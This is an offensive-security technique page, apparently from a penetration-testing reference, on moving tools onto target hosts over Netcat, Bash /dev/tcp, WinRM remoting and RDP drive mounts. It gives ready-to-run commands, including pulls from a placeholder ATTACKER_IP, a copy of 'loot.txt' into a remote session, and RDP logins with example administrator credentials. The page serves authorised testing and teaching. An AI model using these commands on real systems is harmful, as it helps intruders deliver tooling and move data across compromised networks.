---
tool: Transfer when the web is blocked
slug: transfer-channels
kind: technique
stages: [delivery]
category: Netcat, /dev/tcp, RDP and WinRM
platforms: [windows, linux]
services: [winrm, rdp]
ports: [5985, 3389]
tags: [file-transfer, netcat, ncat, dev-tcp, rdp, winrm, pivoting]
attack: [T1105, T1021]
summary: Moving files without an HTTP or SMB server: a raw Netcat or /dev/tcp pipe, an RDP drive mount, or a PowerShell Remoting session. For when outbound web and SMB are filtered.
references:
  - Ncat reference | https://nmap.org/ncat/
  - PowerShell Remoting | https://learn.microsoft.com/en-us/powershell/scripting/learn/remoting/running-remote-commands
---

## Netcat / Ncat

Either side can listen. Listen where the firewall lets you, connect from the other end.

```bash
# Receiver listens, sender connects. -q 0 (nc) or --send-only/--recv-only (ncat)
# close the connection when the file is done.

# Target listens, you push to it
victim$ nc -l -p 8000 > tool          # or: ncat -l -p 8000 --recv-only > tool
attacker$ nc -q 0 HOST 8000 < tool  # or: ncat --send-only HOST 8000 < tool

# You listen, target pulls from you (for inbound-blocked targets)
attacker$ sudo nc -l -p 443 -q 0 < tool
victim$ nc ATTACKER_IP 443 > tool
```

## Bash /dev/tcp (no nc on the target)

```bash
# Receive a file a listener is sending
victim$ cat < /dev/tcp/ATTACKER_IP/443 > tool
# Or speak HTTP by hand to a web server
victim$ exec 3<>/dev/tcp/HOST/80; echo -e "GET /f HTTP/1.1\nHost: x\n\n" >&3; cat <&3
```

## PowerShell Remoting (WinRM)

When HTTP, HTTPS and SMB are all unavailable but WinRM (5985/5986) is open and you have rights on the far host.

```powershell
# From a host you control, into a session on another
$s = New-PSSession -ComputerName DATABASE01
Copy-Item -Path C:\loot.txt -ToSession $s -Destination C:\Users\Public\
Copy-Item -Path C:\Users\Public\data.txt -FromSession $s -Destination C:\
```

## RDP drive mount

Mount a local folder into the RDP session; reach it at `\\tsclient\`.

```bash
xfreerdp /v:HOST /u:administrator /p:'Passw0rd!' /drive:share,/home/kali/share
rdesktop HOST -u administrator -p 'Passw0rd!' -r disk:share=/home/kali/share
```

## Notes

A listener on the attacker side helps when the target blocks inbound connections. `/dev/tcp` needs a Bash built with network redirection (most distros). RDP copy-paste and drive mounts are handy for GUI boxes, but Windows Defender may delete malware the moment a shared folder exposes it. Keep every channel inside the engagement scope.
